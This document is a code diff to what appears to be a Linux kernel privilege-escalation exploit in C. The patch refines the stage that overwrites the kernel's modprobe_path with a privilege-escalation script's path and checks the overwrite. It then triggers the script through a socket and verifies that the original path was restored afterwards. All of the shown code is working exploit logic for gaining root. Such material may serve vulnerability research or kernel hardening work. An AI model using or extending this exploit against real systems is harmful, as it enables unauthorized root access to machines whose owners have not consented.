@@ -280,6 +280,7 @@ int main(void)
 	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	char new_modprobe_path[KMOD_PATH_LEN] = { 0 };
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
 	long i = 0;
@@ -412,20 +413,34 @@ int main(void)
 		break;
 	}
 
-	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	/* Check that the modprobe_path is actually overwritten */
+	ret = get_modprobe_path(new_modprobe_path, sizeof(new_modprobe_path));
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	ret = strncmp(modprobe_path, privesc_script_path, KMOD_PATH_LEN);
+	ret = strncmp(new_modprobe_path, privesc_script_path, KMOD_PATH_LEN);
 	if (ret != 0) {
 		printf("[-] new modprobe_path %s is not privesc_script_path %s\n",
-				modprobe_path, privesc_script_path);
+				new_modprobe_path, privesc_script_path);
 		goto end;
 	}
+	printf("[+] overwritten modprobe_path: %s\n", new_modprobe_path);
 
-	printf("[+] overwritten modprobe_path: %s\n", modprobe_path);
 	trigger_modprobe_sock();
 	result = EXIT_SUCCESS;
+
+	/* Check that the modprobe_path is restored by the privesc script */
+	ret = get_modprobe_path(new_modprobe_path, sizeof(new_modprobe_path));
+	if (ret == EXIT_FAILURE)
+		goto end;
+
+	ret = strncmp(new_modprobe_path, modprobe_path, KMOD_PATH_LEN);
+	if (ret != 0) {
+		printf("[-] the privesc script failed to restore modprobe_path: %s\n",
+				new_modprobe_path);
+		goto end;
+	}
+	printf("[+] restored modprobe_path: %s\n", new_modprobe_path);
 
 end:
 	if (act_fd >= 0) {
